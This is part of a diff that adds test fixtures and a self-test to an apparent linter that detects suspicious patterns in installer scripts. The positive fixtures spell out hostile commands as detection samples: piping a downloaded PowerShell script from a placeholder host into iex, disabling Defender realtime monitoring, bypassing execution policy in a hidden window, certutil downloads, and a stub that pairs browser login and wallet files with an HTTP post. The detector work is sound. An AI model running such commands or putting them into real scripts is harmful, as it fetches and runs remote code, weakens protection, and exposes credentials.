+        ("AV005", "t.ps1", "irm https://example.invalid/x.ps1 | " + _J(("i", "ex")), True),
+        ("AV005", "t.ps1", "Invoke-WebRequest https://example.invalid/x.ps1 -OutFile x.ps1", False),
+        (
+            "AV006",
+            "t.ps1",
+            _J(("Set", "-Mp", "Preference")) + " -Disable" + "RealtimeMonitoring $true",
+            True,
+        ),
+        ("AV006", "t.ps1", "Get-MpComputerStatus", False),
+        (
+            "AV007",
+            "t.ps1",
+            "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy "
+            + _J(("By", "pass"))
+            + " -File a.ps1'",
+            True,
+        ),
+        (
+            "AV007",
+            "t.ps1",
+            "Start-Process powershell -ArgumentList '-ExecutionPolicy RemoteSigned -File a.ps1'",
+            False,
+        ),
+        (
+            "AV008",
+            "s.py",
+            "import os, requests\nHOME = os.environ['HOME']\nA = 'Login"
+            + " Data'\nB = 'wallet"
+            + ".dat'\nrequests.post(u)\n",
+            True,
+        ),
+        (
+            "AV008",
+            "s.py",
+            "import os, requests\nHOME = os.environ['HOME']\nA = ''.join(('Login', ' Data'))\nrequests.post(u)\n",
+            False,
+        ),
+        (
+            "AV009",
+            "t.py",
+            "source = Path(os.environ['SystemRoot']) / 'System32' / 'where.exe'\nshutil.copyfile(source, tmp / 'llama-server.exe')\n",
+            True,
+        ),
+        (
+            "AV009",
+            "t.py",
+            "from windows_console_stub import console_stub_bytes\n(tmp / 'llama-server.exe').write_bytes(console_stub_bytes(0))\n",
+            False,
+        ),
+        (
+            "AV010",
+            "t.py",
+            "import subprocess\n(d / 'trusted-signing-cli.exe').write_bytes(b'not an executable')\nsubprocess.run([d / 'trusted-signing-cli.exe'])\n",
+            True,
+        ),
+        ("AV010", "t.py", "import subprocess\n(d / 'notes.txt').write_bytes(b'text')\n", False),
+        ("AV011", "t.bat", "certutil -urlcache -split -f http://example.invalid/a.exe a.exe", True),
+        ("AV011", "t.bat", "certutil -hashfile a.exe SHA256", False),
+        ("AV012", "t.ps1", "Register-ScheduledTask -TaskName x -Action $a", True),
+        ("AV012", "t.ps1", "Get-ScheduledTask", False),
+        ("AV013", "t.ps1", "$s = -join [char[]](73,69,88)", True),
+        ("AV013", "t.ps1", "$s = 'plain'", False),
+        ("AV014", "install.ps1", "# keeps the " + "anti" + "virus heuristic quiet", True),
+        ("AV014", "install.ps1", "# resolves the venv python before the first pip call", False),
+        ("AV015", "t.ps1", "$sb = [scriptblock]::Create($text)", True),
+        ("AV015", "t.ps1", ". $PSScriptRoot/helpers.ps1", False),
+        # Suppression is honoured outside the shipped installers and ignored inside them.
+        (
+            "AV015",
+            "t.ps1",
+            "$sb = [scriptblock]::Create($text)  # lint-allow: AV015 loads a function body under test",
+            False,
+        ),
+        (
+            "AV003",
+            "install.ps1",
+            "# lint-allow: AV003 because I said so\n$b = $m."
+            + _J(("Define", "PInvoke", "Method"))
+            + "()",
+            True,
+        ),
+    ]
+
+
+def self_test() -> int:
+    failures = []
+    for rule, name, text, should_fire in _fixtures():
+        fired = any(f.rule == rule for f in scan_text(name, text))
+        if fired != should_fire:
+            failures.append(
+                f"{rule} on {name}: expected {'a finding' if should_fire else 'none'}, got {'one' if fired else 'none'}"
+            )
+    covered = {rule for rule, _, _, fire in _fixtures() if fire}
+    missing = sorted(set(RULES_BY_ID) - covered)
+    if missing:
+        failures.append(f"rules with no firing fixture: {', '.join(missing)}")
+    if failures:
+        print("self-test FAILED:\n  " + "\n  ".join(failures))
+        return 1
+    print(f"self-test: ok ({len(_fixtures())} fixtures, {len(RULES)} rules)")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
